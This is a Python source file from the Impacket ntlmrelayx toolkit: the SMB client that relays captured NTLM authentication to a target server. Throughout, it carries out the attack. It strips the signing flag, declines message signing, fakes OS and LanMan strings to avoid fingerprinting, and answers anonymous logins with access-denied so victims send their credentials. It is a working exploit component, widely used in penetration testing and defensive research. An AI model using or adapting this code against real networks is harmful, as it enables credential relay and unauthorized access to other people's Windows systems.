# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# SMB Relay Protocol Client
#
# Author:
#  Alberto Solino (@agsolino)
#
# Description:
#  This is the SMB client which initiates the connection to an
# SMB server and relays the credentials to this server.

import os

from struct import unpack
from socket import error as socketerror
from impacket import LOG
from impacket.examples.ntlmrelayx.clients import ProtocolClient
from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge
from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
    SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
    SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCARD, SMB2Negotiate_Response, \
    SMB2_NEGOTIATE, SMB2Negotiate, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30, SMB2_GLOBAL_CAP_LEASING, \
    SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
    SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SessionError
from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech

PROTOCOL_CLIENT_CLASS = "SMBRelayClient"

class MYSMB(SMB):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negPacket=negPacket)

    def neg_session(self, negPacket=None):
        return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)

class MYSMB3(SMB3):
    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
        self.extendedSecurity = extendedSecurity
        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket))

    def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
        # We DON'T want to sign
        self._Connection['ClientSecurityMode'] = 0

        if self.RequireMessageSigning is True:
            LOG.error('Signing is required, attack won\'t work!')
            return

        self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
        currentDialect = SMB2_DIALECT_WILDCARD

        # Do we have a negSessionPacket already?
        if negSessionResponse is not None:
            # Yes, let's store the dialect answered back
            negResp = SMB2Negotiate_Response(negSessionResponse['Data'])
            currentDialect = negResp['DialectRevision']

        if currentDialect == SMB2_DIALECT_WILDCARD:
            # Still don't know the chosen dialect, let's send our options

            packet = self.SMB_PACKET()
            packet['Command'] = SMB2_NEGOTIATE
            negSession = SMB2Negotiate()

            negSession['SecurityMode'] = self._Connection['ClientSecurityMode']
            negSession['Capabilities'] = self._Connection['Capabilities']
            negSession['ClientGuid'] = self.ClientGuid
            if preferredDialect is not None:
                negSession['Dialects'] = [preferredDialect]
            else:
                negSession['Dialects'] = [SMB2_DIALECT_002, SMB2_DIALECT_21, SMB2_DIALECT_30]
            negSession['DialectCount'] = len(negSession['Dialects'])
            packet['Data'] = negSession

            packetID = self.sendSMB(packet)
            ans = self.recvSMB(packetID)
            if ans.isValidAnswer(STATUS_SUCCESS):
                negResp = SMB2Negotiate_Response(ans['Data'])

        self._Connection['MaxTransactSize']   = min(0x100000,negResp['MaxTransactSize'])
        self._Connection['MaxReadSize']       = min(0x100000,negResp['MaxReadSize'])
        self._Connection['MaxWriteSize']      = min(0x100000,negResp['MaxWriteSize'])
        self._Connection['ServerGuid']        = negResp['ServerGuid']
        self._Connection['GSSNegotiateToken'] = negResp['Buffer']
        self._Connection['Dialect']           = negResp['DialectRevision']
        if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
            LOG.error('Signing is required, attack won\'t work!')
            return
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
            self._Connection['SupportsFileLeasing'] = True
        if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LARGE_MTU) == SMB2_GLOBAL_CAP_LARGE_MTU:
            self._Connection['SupportsMultiCredit'] = True

        if self._Connection['Dialect'] == SMB2_DIALECT_30:
            # Switching to the right packet format
            self.SMB_PACKET = SMB3Packet
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_DIRECTORY_LEASING) == SMB2_GLOBAL_CAP_DIRECTORY_LEASING:
                self._Connection['SupportsDirectoryLeasing'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_MULTI_CHANNEL) == SMB2_GLOBAL_CAP_MULTI_CHANNEL:
                self._Connection['SupportsMultiChannel'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_PERSISTENT_HANDLES) == SMB2_GLOBAL_CAP_PERSISTENT_HANDLES:
                self._Connection['SupportsPersistentHandles'] = True
            if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_ENCRYPTION) == SMB2_GLOBAL_CAP_ENCRYPTION:
                self._Connection['SupportsEncryption'] = True

            self._Connection['ServerCapabilities'] = negResp['Capabilities']
            self._Connection['ServerSecurityMode'] = negResp['SecurityMode']

class SMBRelayClient(ProtocolClient):
    PLUGIN_NAME = "SMB"
    def __init__(self, serverConfig, target, targetPort = 445, extendedSecurity=True ):
        ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
        self.extendedSecurity = extendedSecurity

        self.domainIp = None
        self.machineAccount = None
        self.machineHashes = None
        self.sessionData = {}

        self.keepAliveHits = 1

    def keepAlive(self):
        # SMB Keep Alive more or less every 5 minutes
        if self.keepAliveHits >= (250 / KEEP_ALIVE_TIMER):
            # Time to send a packet
            # Just a tree connect / disconnect to avoid the session timeout
            tid = self.session.connectTree('IPC$')
            self.session.disconnectTree(tid)
            self.keepAliveHits = 1
        else:
            self.keepAliveHits +=1

    def killConnection(self):
        if self.session is not None:
            self.session.close()
            self.session = None

    def initConnection(self):
        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort, manualNegotiate=True)
                                     #,preferredDialect=SMB_DIALECT)
        if self.serverConfig.smb2support is True:
            data = '\x02NT LM 0.12\x00\x02SMB 2.002\x00\x02SMB 2.???\x00'
        else:
            data = '\x02NT LM 0.12\x00'

        if self.extendedSecurity is True:
            flags2 = SMB.FLAGS2_EXTENDED_SECURITY | SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        else:
            flags2 = SMB.FLAGS2_NT_STATUS | SMB.FLAGS2_LONG_NAMES
        try:
            packet = self.session.negotiateSessionWildcard(None, self.targetHost, self.targetHost, self.targetPort, 60, self.extendedSecurity,
                                                  flags1=SMB.FLAGS1_PATHCASELESS | SMB.FLAGS1_CANONICALIZED_PATHS,
                             flags2=flags2, data=data)
        except socketerror as e:
            if 'reset by peer' in str(e):
                if not self.serverConfig.smb2support:
                    LOG.error('SMBCLient error: Connection was reset. Possibly the target has SMBv1 disabled. Try running ntlmrelayx with -smb2support')
                else:
                    LOG.error('SMBCLient error: Connection was reset')
            else:
                LOG.error('SMBCLient error: %s' % str(e))
            return False
        if packet[0] == '\xfe':
            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
        else:
            # Answer is SMB packet, sticking to SMBv1
            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)

        self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                     existingConnection=smbClient, manualNegotiate=True)

        return True

    def setUid(self,uid):
        self._uid = uid

    def sendNegotiate(self, negotiateMessage):
        negotiate = NTLMAuthNegotiate()
        negotiate.fromString(negotiateMessage)
        #Remove the signing flag
        negotiate['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN

        challenge = NTLMAuthChallenge()
        if self.session.getDialect() == SMB_DIALECT:
            challenge.fromString(self.sendNegotiatev1(negotiateMessage))
        else:
            challenge.fromString(self.sendNegotiatev2(negotiateMessage))

        # Store the Challenge in our session data dict. It will be used by the SMB Proxy
        self.sessionData['CHALLENGE_MESSAGE'] = challenge

        return challenge

    def sendNegotiatev2(self, negotiateMessage):
        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        # Let's build a NegTokenInit with the NTLMSSP
        blob = SPNEGO_NegTokenInit()

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['SecurityBufferLength'] = len(blob)
        sessionSetup['Buffer'] = blob.getData()

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data'] = sessionSetup

        packetID = v2client.sendSMB(packet)
        ans = v2client.recvSMB(packetID)
        if ans.isValidAnswer(STATUS_MORE_PROCESSING_REQUIRED):
            v2client._Session['SessionID'] = ans['SessionID']
            sessionSetupResponse = SMB2SessionSetup_Response(ans['Data'])
            respToken = SPNEGO_NegTokenResp(sessionSetupResponse['Buffer'])
            return respToken['ResponseToken']

        return False

    def sendNegotiatev1(self, negotiateMessage):
        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE


        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Let's build a NegTokenInit with the NTLMSSP
        # TODO: In the future we should be able to choose different providers

        blob = SPNEGO_NegTokenInit()

        # NTLMSSP
        blob['MechTypes'] = [TypesMech['NTLMSSP - Microsoft NTLM Security Support Provider']]
        blob['MechToken'] = str(negotiateMessage)

        sessionSetup['Parameters']['SecurityBlobLength']  = len(blob)
        sessionSetup['Parameters'].getData()
        sessionSetup['Data']['SecurityBlob']       = blob.getData()

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)
        smb = v1client.recvSMB()

        try:
            smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
        except Exception:
            LOG.error("SessionSetup Error!")
            raise
        else:
            # We will need to use this uid field for all future requests/responses
            v1client.set_uid(smb['Uid'])

            # Now we have to extract the blob to continue the auth process
            sessionResponse   = SMBCommand(smb['Data'][0])
            sessionParameters = SMBSessionSetupAndX_Extended_Response_Parameters(sessionResponse['Parameters'])
            sessionData       = SMBSessionSetupAndX_Extended_Response_Data(flags = smb['Flags2'])
            sessionData['SecurityBlobLength'] = sessionParameters['SecurityBlobLength']
            sessionData.fromString(sessionResponse['Data'])
            respToken = SPNEGO_NegTokenResp(sessionData['SecurityBlob'])

            return respToken['ResponseToken']

    def sendStandardSecurityAuth(self, sessionSetupData):
        v1client = self.session.getSMBServer()
        flags2 = v1client.get_flags()[1]
        v1client.set_flags(flags2=flags2 & (~SMB.FLAGS2_EXTENDED_SECURITY))
        if sessionSetupData['Account'] != '':
            smb = NewSMBPacket()
            smb['Flags1'] = 8

            sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
            sessionSetup['Parameters'] = SMBSessionSetupAndX_Parameters()
            sessionSetup['Data'] = SMBSessionSetupAndX_Data()

            sessionSetup['Parameters']['MaxBuffer'] = 65535
            sessionSetup['Parameters']['MaxMpxCount'] = 2
            sessionSetup['Parameters']['VCNumber'] = os.getpid()
            sessionSetup['Parameters']['SessionKey'] = v1client._dialects_parameters['SessionKey']
            sessionSetup['Parameters']['AnsiPwdLength'] = len(sessionSetupData['AnsiPwd'])
            sessionSetup['Parameters']['UnicodePwdLength'] = len(sessionSetupData['UnicodePwd'])
            sessionSetup['Parameters']['Capabilities'] = SMB.CAP_RAW_MODE

            sessionSetup['Data']['AnsiPwd'] = sessionSetupData['AnsiPwd']
            sessionSetup['Data']['UnicodePwd'] = sessionSetupData['UnicodePwd']
            sessionSetup['Data']['Account'] = str(sessionSetupData['Account'])
            sessionSetup['Data']['PrimaryDomain'] = str(sessionSetupData['PrimaryDomain'])
            sessionSetup['Data']['NativeOS'] = 'Unix'
            sessionSetup['Data']['NativeLanMan'] = 'Samba'

            smb.addCommand(sessionSetup)

            v1client.sendSMB(smb)
            smb = v1client.recvSMB()
            try:
                smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
            except:
                return None, STATUS_LOGON_FAILURE
            else:
                v1client.set_uid(smb['Uid'])
                return smb, STATUS_SUCCESS
        else:
            # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
            clientResponse = None
            errorCode = STATUS_ACCESS_DENIED

        return clientResponse, errorCode

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        if unpack('B', str(authenticateMessageBlob)[:1])[0] != SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
            # We need to wrap the NTLMSSP into SPNEGO
            respToken2 = SPNEGO_NegTokenResp()
            respToken2['ResponseToken'] = str(authenticateMessageBlob)
            authData = respToken2.getData()
        else:
            authData = str(authenticateMessageBlob)

        if self.session.getDialect() == SMB_DIALECT:
            token, errorCode = self.sendAuthv1(authData, serverChallenge)
        else:
            token, errorCode = self.sendAuthv2(authData, serverChallenge)
        return token, errorCode

    def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
        v2client = self.session.getSMBServer()

        sessionSetup = SMB2SessionSetup()
        sessionSetup['Flags'] = 0

        packet = v2client.SMB_PACKET()
        packet['Command'] = SMB2_SESSION_SETUP
        packet['Data']    = sessionSetup

        # Reusing the previous structure
        sessionSetup['SecurityBufferLength'] = len(authenticateMessageBlob)
        sessionSetup['Buffer'] = authenticateMessageBlob

        packetID = v2client.sendSMB(packet)
        packet = v2client.recvSMB(packetID)

        return packet, packet['Status']

    def sendAuthv1(self, authenticateMessageBlob, serverChallenge=None):
        v1client = self.session.getSMBServer()

        smb = NewSMBPacket()
        smb['Flags1'] = SMB.FLAGS1_PATHCASELESS
        smb['Flags2'] = SMB.FLAGS2_EXTENDED_SECURITY
        # Are we required to sign SMB? If so we do it, if not we skip it
        if v1client.is_signing_required():
           smb['Flags2'] |= SMB.FLAGS2_SMB_SECURITY_SIGNATURE
        smb['Uid'] = v1client.get_uid()

        sessionSetup = SMBCommand(SMB.SMB_COM_SESSION_SETUP_ANDX)
        sessionSetup['Parameters'] = SMBSessionSetupAndX_Extended_Parameters()
        sessionSetup['Data']       = SMBSessionSetupAndX_Extended_Data()

        sessionSetup['Parameters']['MaxBufferSize']        = 65535
        sessionSetup['Parameters']['MaxMpxCount']          = 2
        sessionSetup['Parameters']['VcNumber']             = 1
        sessionSetup['Parameters']['SessionKey']           = 0
        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE

        # Fake Data here, don't want to get us fingerprinted
        sessionSetup['Data']['NativeOS']      = 'Unix'
        sessionSetup['Data']['NativeLanMan']  = 'Samba'

        sessionSetup['Parameters']['SecurityBlobLength'] = len(authenticateMessageBlob)
        sessionSetup['Data']['SecurityBlob'] = authenticateMessageBlob
        smb.addCommand(sessionSetup)
        v1client.sendSMB(smb)

        smb = v1client.recvSMB()

        errorCode = smb['ErrorCode'] << 16
        errorCode += smb['_reserved'] << 8
        errorCode += smb['ErrorClass']

        return smb, errorCode

    def getStandardSecurityChallenge(self):
        if self.session.getDialect() == SMB_DIALECT:
            return self.session.getSMBServer().get_encryption_key()
        else:
            return None
